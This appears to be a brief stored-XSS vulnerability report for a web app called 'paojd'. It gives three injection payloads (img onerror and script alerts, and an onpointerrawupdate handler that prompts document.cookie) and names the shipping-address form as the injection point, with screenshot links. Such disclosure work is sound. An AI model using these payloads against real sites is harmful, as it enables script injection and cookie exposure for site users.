

payload:

~~~
< img src="" onerror="alert('xss 注入')" /><SCRIPT>alert('XSS')</SCRIPT>">
~~~

~~~
<img src="" onerror="alert('xss 注入')" />
~~~

~~~
<img src=x onpointerrawupdate=(prompt)(document.cookie)>
~~~

My shipping address

Add a new shipping address under my shipping address

~~~
https://127.0.0.1/user/address
~~~

![1699343693574](paojd_Stored XSS.assets/1699343693574.png)

![1699343599707](paojd_Stored XSS.assets/1699343599707.png)

![1699343669059](paojd_Stored XSS.assets/1699343669059.png)